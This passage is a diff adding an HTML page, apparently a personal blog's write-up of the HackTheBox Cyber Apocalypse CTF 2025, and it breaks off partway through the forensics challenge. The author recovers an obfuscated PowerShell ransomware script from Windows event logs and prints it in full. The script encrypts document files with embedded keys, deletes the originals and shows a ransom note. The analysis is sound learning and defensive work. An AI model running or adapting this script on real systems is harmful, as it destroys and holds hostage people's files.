@@ -1,0 +1,1089 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB Cyber Apocalypse CTF 2025 | baioc</title>
+<meta name="description" content="Writeups for 3 challenges, each in a different category">
+
+
+  <meta name="author" content="Gabriel B. Sant'Anna">
+  
+  <meta property="article:author" content="Gabriel B. Sant'Anna">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en">
+<meta property="og:site_name" content="baioc">
+<meta property="og:title" content="HTB Cyber Apocalypse CTF 2025">
+<meta property="og:url" content="https://www.baioc.dev/writeup/htb-cyber-apocalypse-2025/">
+
+
+  <meta property="og:description" content="Writeups for 3 challenges, each in a different category">
+
+
+
+  <meta property="og:image" content="https://www.baioc.dev/assets/images/htb-cyber-apocalypse-2025/cave-expedition-decrypt.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2025-03-26T00:00:00+00:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://www.baioc.dev/writeup/htb-cyber-apocalypse-2025/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="baioc Feed">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script type="text/javascript">
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+  
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+
+  
+    <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single long">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Home
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/portfolio/"
+                
+                
+              >Portfolio</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/resume/"
+                
+                
+              >Resume</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/blog/"
+                
+                
+              >Blog</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB Cyber Apocalypse CTF 2025">
+    <meta itemprop="description" content="Writeups for 3 challenges, each in a different category">
+    <meta itemprop="datePublished" content="2025-03-26T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">
+            <a href="https://www.baioc.dev/writeup/htb-cyber-apocalypse-2025/" itemprop="url">HTB Cyber Apocalypse CTF 2025
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2025-03-26T00:00:00+00:00">March 26, 2025</time>
+      </span>
+    
+
+    
+
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-bars"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#forensics---cave-expedition">Forensics - Cave Expedition</a><ul><li><a href="#file-identification">File Identification</a></li><li><a href="#log-analysis">Log Analysis</a></li><li><a href="#malware-deobfuscation">Malware Deobfuscation</a></li><li><a href="#decryption">Decryption</a></li></ul></li><li><a href="#crypto---traces">Crypto - Traces</a><ul><li><a href="#server-interaction">Server Interaction</a></li><li><a href="#local-reproduction">Local Reproduction</a></li><li><a href="#cryptoanalysis">Cryptoanalysis</a></li><li><a href="#known-plaintext-attack">Known-Plaintext Attack</a></li></ul></li><li><a href="#web---cyber-attack">Web - Cyber Attack</a><ul><li><a href="#web-recon">Web Recon</a></li><li><a href="#source-analysis">Source Analysis</a></li><li><a href="#command-injection">Command Injection</a></li><li><a href="#crlf-and-header-injection">CRLF and Header Injection</a></li><li><a href="#confusion-attacks">Confusion Attacks</a></li><li><a href="#ssrf-attack">SSRF Attack</a></li><li><a href="#rce-and-exfiltration">RCE and Exfiltration</a></li></ul></li></ul>
+            </nav>
+          </aside>
+        
+        <p>I’m writing this just as <a href="https://www.hackthebox.com/events/cyber-apocalypse-2025">this year’s HackTheBox Cyber Apocalypse CTF</a> comes to an end.</p>
+
+<p>I invited some friends and a few university freshmen to participate, and despite this being the first time in a cybersecurity CTF for most of the team, we ended up solving slightly more than a third (37%) of the challenges, capturing 29 out of 77 flags over a weekend.
+Our team didn’t make it to the podium (unsurprisingly), but we managed to place in the top 10% among all ~8k teams which signed up.</p>
+
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cert.jpg" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cert.jpg" alt="participation certificate" /></a></figure>
+
+<p>Personally, I think it was a good learning opportunity, and I’m looking forward to reading other people’s writeups on the challenges which we couldn’t solve.
+In the meantime, here is how I solved 3 particular challenges, each one in a different category and all with less than 1k solves:</p>
+<ul>
+  <li><a href="#forensics---cave-expedition">Forensics - Cave Expedition</a></li>
+  <li><a href="#crypto---traces">Crypto - Traces</a></li>
+  <li><a href="#web---cyber-attack">Web - Cyber Attack</a></li>
+</ul>
+
+<h2 id="forensics---cave-expedition">Forensics - Cave Expedition</h2>
+
+<blockquote>
+  <p>Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide.
+The village has offered a hefty bounty for its defeat.
+Sir Alaric and Thorin answered the call also returning with treasures from its lair.
+Among the retrieved items they found a map.
+Unfortunately it cannot be used directly because a custom encryption algorithm was probably used.
+Luckily it was possible to retrieve the original code that managed the encryption process.
+Can you investigate about what happened and retrieve the map content?</p>
+</blockquote>
+
+<h3 id="file-identification">File Identification</h3>
+
+<p>In this challenge, we’re only given a couple of files:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span> forensics_cave_expedition
+<span class="nb">.</span>  ..  Logs.zip  map.pdf.secured
+
+<span class="nv">$ </span>file forensics_cave_expedition/<span class="k">*</span>
+forensics_cave_expedition/Logs.zip:        Zip archive data, at least v2.0 to extract, compression <span class="nv">method</span><span class="o">=</span>deflate
+forensics_cave_expedition/map.pdf.secured: ASCII text, with very long lines <span class="o">(</span>65536<span class="o">)</span>, with no line terminators
+</code></pre></div></div>
+
+<p>After a quick look at <code class="language-plaintext highlighter-rouge">map.pdf.secured</code>, we know it’s probably base64-encoded.
+Decoding it reveals a binary blob which <code class="language-plaintext highlighter-rouge">file</code> can’t identify, and using <a href="https://github.com/gcarmix/HexWalk">HexWalk</a> reveals it has high entropy throughout.
+This really seems like an encrypted file, as stated in the challenge description.</p>
+
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-encrypted.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-encrypted.png" alt="encrypted map" /></a></figure>
+
+<p>Our small piece of lore also claims “it was possible to retrieve the original code that managed the encryption process”, so let’s look into the other file now.</p>
+
+<h3 id="log-analysis">Log Analysis</h3>
+
+<p>Within <code class="language-plaintext highlighter-rouge">Logs.zip</code>, we have 425 EVTX files, that is, Windows Event Logs.
+In Kali, we can <code class="language-plaintext highlighter-rouge">apt install python3-evtx</code> and then dump those into a more readable format with <code class="language-plaintext highlighter-rouge">evtx_dump.py</code>.
+Grabbing one of these log files at random, it looked like this:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.1" encoding="utf-8" standalone="yes" ?&gt;</span>
+<span class="nt">&lt;Events&gt;</span>
+<span class="nt">&lt;/Events&gt;</span>
+</code></pre></div></div>
+
+<p>So having most files empty, I sorted by size and started looking into the only one which stood out: <code class="language-plaintext highlighter-rouge">Logs/Microsoft-Windows-Sysmon_Operational.evtx</code>.
+After a quick look, we could see some interesting commands being executed, which you can see me grepping for below.</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-logs.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-logs.png" alt="reading EVTX logs" /></a></figure>
+
+<p>You can see some powershell lines printing pieces of base64 to a file, then decoding and executing it.
+We can reassemble the base64, and decode it into the following:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$k34Vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"</span><span class="w">
+</span><span class="nv">$m78Vo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="</span><span class="w">
+</span><span class="nv">$a53Va</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="</span><span class="w">
+</span><span class="nv">$b64Vb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"</span><span class="w">
+
+</span><span class="nv">$e90Vg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{}</span><span class="w">
+</span><span class="nv">$f12Vh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{}</span><span class="w">
+
+</span><span class="kr">For</span><span class="w"> </span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">65</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="o">-le</span><span class="w"> </span><span class="mi">90</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$e90Vg</span><span class="p">[([</span><span class="n">char</span><span class="p">]</span><span class="nv">$x</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">if</span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">90</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">char</span><span class="p">]</span><span class="mi">65</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">char</span><span class="p">](</span><span class="nv">$x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">n90Vp</span><span class="w"> </span><span class="p">{</span><span class="w">
+     </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$m78Vo</span><span class="p">))</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">l56Vn</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">return</span><span class="w"> </span><span class="p">(</span><span class="n">a12Vc</span><span class="w"> </span><span class="nv">$k34Vm</span><span class="p">)</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">For</span><span class="w"> </span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">97</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="o">-le</span><span class="w"> </span><span class="mi">122</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$e90Vg</span><span class="p">[([</span><span class="n">char</span><span class="p">]</span><span class="nv">$x</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">if</span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">122</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">char</span><span class="p">]</span><span class="mi">97</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">char</span><span class="p">](</span><span class="nv">$x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">a12Vc</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">string</span><span class="p">]</span><span class="nv">$a34Vd</span><span class="p">)</span><span class="w">
+    </span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$a34Vd</span><span class="p">))</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="nv">$c56Ve</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a12Vc</span><span class="w"> </span><span class="nv">$a53Va</span><span class="w">
+</span><span class="nv">$d78Vf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a12Vc</span><span class="w"> </span><span class="nv">$b64Vb</span><span class="w">
+
+</span><span class="kr">For</span><span class="w"> </span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">48</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="o">-le</span><span class="w"> </span><span class="mi">57</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$e90Vg</span><span class="p">[([</span><span class="n">char</span><span class="p">]</span><span class="nv">$x</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">if</span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">57</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">char</span><span class="p">]</span><span class="mi">48</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">char</span><span class="p">](</span><span class="nv">$x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="nv">$e90Vg</span><span class="o">.</span><span class="nf">GetEnumerator</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$f12Vh</span><span class="p">[</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Value</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Key</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">l34Vn</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$m56Vo</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$n78Vp</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$o90Vq</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$p12Vr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]::</span><span class="n">new</span><span class="p">(</span><span class="nv">$m56Vo</span><span class="o">.</span><span class="nf">Length</span><span class="p">)</span><span class="w">
+    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$m56Vo</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w"> </span><span class="nv">$x</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nv">$q34Vs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$n78Vp</span><span class="p">[</span><span class="nv">$x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nv">$n78Vp</span><span class="o">.</span><span class="nf">Length</span><span class="p">]</span><span class="w">
+        </span><span class="nv">$r56Vt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$o90Vq</span><span class="p">[</span><span class="nv">$x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nv">$o90Vq</span><span class="o">.</span><span class="nf">Length</span><span class="p">]</span><span class="w">
+        </span><span class="nv">$p12Vr</span><span class="p">[</span><span class="nv">$x</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$m56Vo</span><span class="p">[</span><span class="nv">$x</span><span class="p">]</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="nv">$q34Vs</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="nv">$r56Vt</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$p12Vr</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">s78Vu</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$t90Vv</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$u12Vw</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$v34Vx</span><span class="p">)</span><span class="w">
+
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$t90Vv</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$null</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$t90Vv</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">return</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+    </span><span class="nv">$y90Va</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$u12Vw</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$z12Vb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$v34Vx</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$a34Vc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">l34Vn</span><span class="w"> </span><span class="nv">$t90Vv</span><span class="w"> </span><span class="nv">$y90Va</span><span class="w"> </span><span class="nv">$z12Vb</span><span class="w">
+
+    </span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$a34Vc</span><span class="p">)</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">o12Vq</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">([</span><span class="n">switch</span><span class="p">]</span><span class="nv">$p34Vr</span><span class="p">)</span><span class="w">
+
+    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$p34Vr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$q56Vs</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">l56Vn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nv">$d34Vp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"dca01aq2/"</span><span class="w">
+                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$d34Vp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                    </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$d34Vp</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w"> </span><span class="o">|</span><span class="w">
+                        </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Extension</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"^\.</span><span class="nv">$q56Vs</span><span class="s2">$"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
+                        </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+                            </span><span class="nv">$r78Vt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w">
+                            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$r78Vt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                                </span><span class="nv">$s90Vu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$r78Vt</span><span class="p">)</span><span class="w">
+                                </span><span class="nv">$t12Vv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s78Vu</span><span class="w"> </span><span class="nv">$s90Vu</span><span class="w"> </span><span class="nv">$c56Ve</span><span class="w"> </span><span class="nv">$d78Vf</span><span class="w">
+                                </span><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">WriteAllText</span><span class="p">(</span><span class="s2">"</span><span class="nv">$r78Vt</span><span class="s2">.secured"</span><span class="p">,</span><span class="w"> </span><span class="nv">$t12Vv</span><span class="p">)</span><span class="w">
+                                </span><span class="n">Remove-Item</span><span class="w"> </span><span class="nv">$r78Vt</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+                            </span><span class="p">}</span><span class="w">
+                        </span><span class="p">}</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    </span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"developer56546756"</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">COMPUTERNAME</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Workstation5678"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">o12Vq</span><span class="w"> </span><span class="nt">-p34Vr</span><span class="w">
+    </span><span class="n">n90Vp</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="malware-deobfuscation">Malware Deobfuscation</h3>
+
+<p>While this may look scary, the only dangerous pieces of this obfuscated powershell script are the calls to <code class="language-plaintext highlighter-rouge">[IO.File]::WriteAllText</code> and <code class="language-plaintext highlighter-rouge">Remove-Item</code>, within function <code class="language-plaintext highlighter-rouge">o12Vq</code>.
+Because of the conditional in the bottom, that’s only executed in a very specific environment.
+Furthermore, we can use a powershell interpreter to check out what some of these functions do, and what the base64 encoded strings translate to:</p>
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-ransomware.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-ransomware.png" alt="executing a safe function" /></a></figure>
+
+<figure class=""><a href="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-variables.png" class="image-popup"><img src="/assets/images/htb-cyber-apocalypse-2025/cave-expedition-variables.png" alt="printing variables" /></a></figure>
+
+<p>Here’s a more readable version of the important parts:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$extensions_encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"</span><span class="w">
+</span><span class="nv">$key0_encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="</span><span class="w">
+</span><span class="nv">$key1_encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">base64_decode</span><span class="w"> </span><span class="p">{</span><span class="w">
